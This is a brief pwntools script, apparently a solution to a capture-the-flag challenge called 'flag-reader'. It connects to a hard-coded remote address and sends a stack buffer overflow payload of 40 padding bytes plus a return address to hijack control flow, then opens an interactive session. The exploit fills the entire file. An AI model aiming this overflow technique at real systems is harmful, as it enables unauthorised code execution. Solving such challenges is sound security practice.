from pwn import *

p = remote('35.224.53.124', 1339)
#p=process('./chal/flag-reader')
p.sendlineafter('think?', b'A'*40+p64(0x401146))
p.interactive()
